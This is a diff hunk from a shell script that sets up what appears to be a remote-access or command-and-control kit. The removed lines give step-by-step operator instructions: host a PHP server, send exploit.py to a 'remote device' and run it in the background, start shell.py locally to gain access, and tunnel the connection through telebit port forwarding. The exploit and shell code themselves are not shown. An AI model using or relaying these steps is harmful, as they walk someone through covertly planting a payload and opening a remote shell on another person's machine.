@@ -326,17 +326,3 @@ EOF
 sudo chmod 777 shell.py
 
 echo -e "\n[ 6 ] All files are created successfully"
-
-echo -e "\nYour Linux machine should have PHP installed and python3"
-echo -e "And some python packages like : os, sys, socket, uuid, json, requests, time, psutil, subprocess"
-echo -e "Installed them by pip3 install <package name>"
-
-sleep 1
-echo -e "\nNow start a php server on local device \nUsing : sudo php -S 127.0.0.1:80"
-echo -e "Then send exploit.py file to remote device and excecute \nwith : python3 exploit.py <domain name>&"
-echo -e "Now your local device need to start shell.py file\nUsing python3 shell.py"
-echo -e "You would got teh access with proper network connection"
-echo -e "If you tries it on local network it's fine just use local device IP"
-echo -e "where PHP server is running\nOr you can use port forwording like telebit\nUse : ~/telebit http 80   and run PHP server on localhost on port 80"
-
-echo -e "\nThank You"
